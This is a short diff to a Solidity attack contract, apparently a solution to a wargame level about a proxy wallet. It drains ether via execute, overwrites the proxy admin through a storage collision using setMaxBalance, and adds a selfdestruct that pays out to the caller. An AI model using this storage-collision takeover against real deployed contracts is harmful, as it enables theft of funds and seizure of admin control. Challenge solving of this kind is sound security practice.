@@ -35,7 +35,8 @@ contract Attack24 {
         target.execute(msg.sender, 0.002 ether, "");
         target.setMaxBalance(uint256(uint160(msg.sender)));
 
-        require(proxy.admin() == msg.sender, "the hack failed!!"); //  <-- not sure if this will work
+        require(proxy.admin() == msg.sender, "the hack failed!!"); //  <-- not sure if this 
+        selfdestruct(payable(msg.sender));                         //  <-- will work
      }
 }
 
